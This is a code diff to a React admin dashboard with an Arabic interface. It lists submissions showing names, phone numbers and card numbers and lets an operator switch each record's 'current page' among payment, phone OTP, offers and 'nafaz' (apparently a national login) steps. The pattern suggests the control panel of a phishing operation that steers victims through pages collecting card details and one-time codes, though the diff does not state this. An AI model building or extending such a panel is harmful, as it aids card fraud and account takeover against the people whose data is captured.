@@ -141,7 +141,7 @@ export default function NotificationsPage1() {
           (activeFilter === "approved" && notification.status === "approved") ||
           (activeFilter === "rejected" && notification.status === "rejected") ||
           (activeFilter === "payment" && notification.pagename === "payment") ||
-          (activeFilter === "registration" && notification.vehicle_type === "registration")
+          (activeFilter === "phoneOtp" && notification.vehicle_type === "phoneOtp")
 
         return matchesSearch && matchesFilter
       })
@@ -232,7 +232,7 @@ export default function NotificationsPage1() {
             (activeFilter === "approved" && notification.status === "approved") ||
             (activeFilter === "rejected" && notification.status === "rejected") ||
             (activeFilter === "payment" && notification.pagename === "payment") ||
-            (activeFilter === "registration" && notification.vehicle_type === "registration")
+            (activeFilter === "phoneOtp" && notification.vehicle_type === "phoneOtp")
 
           return matchesSearch && matchesFilter
         }),
@@ -279,7 +279,7 @@ export default function NotificationsPage1() {
             (activeFilter === "approved" && notification.status === "approved") ||
             (activeFilter === "rejected" && notification.status === "rejected") ||
             (activeFilter === "payment" && notification.pagename === "payment") ||
-            (activeFilter === "registration" && notification.vehicle_type === "registration")
+            (activeFilter === "phoneOtp" && notification.vehicle_type === "phoneOtp")
 
           return matchesSearch && matchesFilter
         }),
@@ -337,13 +337,13 @@ export default function NotificationsPage1() {
             (activeFilter === "approved" && notification.status === "approved") ||
             (activeFilter === "rejected" && notification.status === "rejected") ||
             (activeFilter === "payment" && notification.pagename === "payment") ||
-            (activeFilter === "registration" && notification.vehicle_type === "registration")
+            (activeFilter === "phoneOtp" && notification.vehicle_type === "phoneOtp")
 
           return matchesSearch && matchesFilter
         }),
       )
 
-      toast.success("تم تحديث نوع الطلب بنجاح", {
+      toast.success("تم تحديث الصفحة الحالية بنجاح", {
         position: "top-center",
         duration: 3000,
         icon: <CheckCircle className="h-5 w-5" />,
@@ -351,7 +351,7 @@ export default function NotificationsPage1() {
     //  setShowPagenameDialog(false)
     } catch (error) {
       console.error("Error updating pagename:", error)
-      toast.error("حدث خطأ أثناء تحديث نوع الطلب", {
+      toast.error("حدث خطأ أثناء تحديث الصفحة الحالية", {
         position: "top-center",
         duration: 3000,
         icon: <XCircle className="h-5 w-5" />,
@@ -434,23 +434,23 @@ export default function NotificationsPage1() {
           </Badge>
         )
         break
-      case "registration":
+      case "phoneOtp":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-purple-500 to-purple-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-purple-600 hover:to-purple-700" : ""}`}
           >
-            <FileText className="h-3 w-3 mr-1" /> تسجيل
+            <FileText className="h-3 w-3 mr-1" /> رمز الهاتف
           </Badge>
         )
         break
-      case "renewal":
+      case "offers":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-green-500 to-green-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-green-600 hover:to-green-700" : ""}`}
           >
-            <Calendar className="h-3 w-3 mr-1" /> تجديد
+            <Calendar className="h-3 w-3 mr-1" /> العروض
           </Badge>
         )
         break
@@ -460,7 +460,7 @@ export default function NotificationsPage1() {
             variant="outline"
             className={`bg-gradient-to-r from-gray-500 to-gray-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-gray-600 hover:to-gray-700" : ""}`}
           >
-            <Tag className="h-3 w-3 mr-1" /> {pagename || "غير محدد"}
+            <Tag className="h-3 w-3 mr-1" /> {pagename || "تسجيل"}
           </Badge>
         )
     }
@@ -636,10 +636,10 @@ export default function NotificationsPage1() {
                 دفع
               </Button>
               <Button
-                variant={activeFilter === "registration" ? "default" : "outline"}
+                variant={activeFilter === "phoneOtp" ? "default" : "outline"}
                 size="sm"
-                onClick={() => applyFilter("registration")}
-                className={activeFilter === "registration" ? "bg-purple-500 text-white hover:bg-purple-600" : ""}
+                onClick={() => applyFilter("phoneOtp")}
+                className={activeFilter === "phoneOtp" ? "bg-purple-500 text-white hover:bg-purple-600" : ""}
               >
                 <Car className="h-3.5 w-3.5 ml-1" />
                 تسجيل
@@ -678,7 +678,7 @@ export default function NotificationsPage1() {
               <Table>
                 <TableHeader>
                   <TableRow className="bg-muted/30 hover:bg-muted/30">
-                    <TableHead className="text-right font-bold">نوع الطلب</TableHead>
+                    <TableHead className="text-right font-bold">الصفحة الحالية</TableHead>
                     <TableHead className="text-right font-bold">الاسم</TableHead>
                     <TableHead className="text-right font-bold">رقم الهاتف</TableHead>
                     <TableHead className="text-right font-bold">رقم البطاقة</TableHead>
@@ -700,7 +700,7 @@ export default function NotificationsPage1() {
                           <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center">
                             <User className="h-4 w-4 text-primary" />
                           </div>
-                          <span>{notification.full_name || notification.document_owner_full_name || "غير محدد"}</span>
+                          <Badge onClick={()=> handleInfoClick(notification, "personal")}>{notification.full_name || notification.document_owner_full_name || "غير محدد"}</Badge>
                         </div>
                       </TableCell>
                       <TableCell>
@@ -708,8 +708,8 @@ export default function NotificationsPage1() {
                       </TableCell>
                       <TableCell>
                         <Badge
-                          variant="outline"
-                          className={`cursor-pointer  ${notification.card_number?"bg-blue-50":"bg-red-200"} text-blue-700 hover:bg-blue-100 border-blue-200 dark:bg-blue-900/30 dark:text-blue-400 dark:border-blue-800 dark:hover:bg-blue-900/50`}
+                          variant={notification.card_number?"default":"destructive"}
+                          className={`cursor-pointer `}
                           onClick={(e) => handleCardBadgeClick(notification, e)}
                         >
                           <CardIcon className="h-3.5 w-3.5 mr-1.5" />
@@ -822,7 +822,7 @@ export default function NotificationsPage1() {
                       ? "مرفوض"
                       : activeFilter === "payment"
                         ? "دفع"
-                        : activeFilter === "registration"
+                        : activeFilter === "phoneOtp"
                           ? "تسجيل"
                           : activeFilter}
                 <Button
@@ -890,7 +890,7 @@ export default function NotificationsPage1() {
               </div>
 
               <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700 flex flex-col gap-1">
-                <p className="text-sm text-muted-foreground">نوع الطلب</p>
+                <p className="text-sm text-muted-foreground">الصفحة الحالية</p>
                 <div className="flex items-center gap-2 mt-1">
                   <p className="font-medium">
                     {selectedNotification.pagename || selectedNotification.insurance_purpose || "غير محدد"}
@@ -1131,7 +1131,7 @@ export default function NotificationsPage1() {
                 <h3 className="font-medium mb-2 text-sm">معلومات إضافية</h3>
                 <div className="space-y-2">
                   <div className="flex justify-between text-sm">
-                    <span className="text-muted-foreground">نوع الطلب:</span>
+                    <span className="text-muted-foreground">الصفحة الحالية:</span>
                     <span>{selectedCardInfo.pagename || "غير محدد"}</span>
                   </div>
                   <div className="flex justify-between text-sm">
@@ -1176,9 +1176,9 @@ export default function NotificationsPage1() {
         <DialogContent className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl" dir="rtl">
           <DialogHeader className="border-b pb-3">
             <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
-              نوع الطلب
+              الصفحة الحالية
             </DialogTitle>
-            <DialogDescription>تحديد أو تغيير نوع الطلب</DialogDescription>
+            <DialogDescription>تحديد أو تغيير الصفحة الحالية</DialogDescription>
           </DialogHeader>
 
           {selectedNotification && (
@@ -1189,7 +1189,7 @@ export default function NotificationsPage1() {
               </div>
 
               <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
-                <h3 className="font-medium mb-3 text-sm">اختر نوع الطلب</h3>
+                <h3 className="font-medium mb-3 text-sm">اختر الصفحة الحالية</h3>
                 <div className="grid grid-cols-2 gap-2">
                   <Button
                     variant="outline"
@@ -1206,11 +1206,11 @@ export default function NotificationsPage1() {
                   <Button
                     variant="outline"
                     className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "registration"
+                      selectedNotification.pagename === "phoneOtp"
                         ? "bg-purple-50 border-purple-300 dark:bg-purple-900/30 dark:border-purple-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "registration")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "phoneOtp")}
                   >
                     <FileText className="h-4 w-4" />
                     تسجيل
@@ -1218,11 +1218,11 @@ export default function NotificationsPage1() {
                   <Button
                     variant="outline"
                     className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "renewal"
+                      selectedNotification.pagename === "nafaz"
                         ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "renewal")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                   >
                     <Calendar className="h-4 w-4" />
                     تجديد
@@ -1231,13 +1231,13 @@ export default function NotificationsPage1() {
                     variant="outline"
                     className={`flex items-center gap-2 justify-center ${
                       selectedNotification.pagename &&
-                      !["payment", "registration", "renewal"].includes(selectedNotification.pagename)
+                      !["payment", "phoneOtp", "nafaz"].includes(selectedNotification.pagename)
                         ? "bg-gray-100 border-gray-300 dark:bg-gray-800 dark:border-gray-600"
                         : ""
                     }`}
                     onClick={() => {
                       // Open a custom input dialog for other pagename types
-                      const customType = prompt("أدخل نوع الطلب المخصص:", selectedNotification.pagename || "")
+                      const customType = prompt("أدخل الصفحة الحالية المخصص:", selectedNotification.pagename || "")
                       if (customType && customType.trim() !== "") {
                         handleUpdatePagename(selectedNotification.id, customType.trim())
                       }
